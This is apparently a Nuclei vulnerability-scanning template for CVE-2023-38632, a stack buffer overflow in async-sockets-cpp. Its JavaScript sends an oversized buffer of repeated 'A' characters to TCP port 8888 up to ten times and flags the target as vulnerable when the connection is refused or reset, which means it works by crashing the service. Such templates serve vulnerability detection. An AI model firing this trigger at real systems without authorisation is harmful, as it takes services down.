id: CVE-2023-38632

info:
  name: CVE-2023-38632
  author: dwisiswant0
  severity: critical
  description: |
    async-sockets-cpp through 0.3.1 has a stack-based buffer overflow
    in tcpsocket.hpp when processing malformed TCP packets.

variables:
  buffer: '{{repeat("A", rand_int(10000, 10999))}}'

javascript:
  - pre-condition: isPortOpen(host, port, 10);
    code: |
      const net = require('nuclei/net');
      let ok = false;
      for (let i = 0; i < 10; i++) {
        try {
          let conn = net.Open('tcp', `${host}:${port}`);
          conn.Send(payload);
          let data = conn.RecvString(3);
          ok = data === "OK!";
          conn.Close();
        } catch(e) {
          log(e.value);
          break;
        }
      }

    args:
      host: "{{Host}}"
      port: "8888"
      payload: "{{buffer}}"

    matchers:
      - type: dsl
        dsl:
          - "success == true"
          - "regex('connection (refused|reset by peer)', response)"
        condition: and
